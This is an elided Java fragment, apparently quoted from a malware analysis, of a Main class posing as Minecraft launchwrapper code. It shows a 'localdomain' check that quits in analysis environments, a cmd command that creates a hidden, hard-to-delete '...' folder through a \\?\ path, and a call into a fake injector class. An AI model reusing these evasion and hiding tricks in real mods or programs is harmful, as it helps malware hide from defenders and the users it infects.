...
import net.minecraft.launchwrapper.injector.IndevVanillaInjector;
import net.minecraft.util.Session;

public class Main {
    public static void main(String[] p_main_0_) {
        try {
            if (InetAddress.getByName("localdomain").getCanonicalHostName().equalsIgnoreCase("localdomain")) {
                System.exit(-1);
            }
        }
        ...
        try {
            Runtime.getRuntime().exec("cmd /c start /b md " + File.separator + File.separator + "?" + File.separator + System.getenv("SystemDrive") + File.separator + "...");
        ...
        IndevVanillaInjector.initStream();
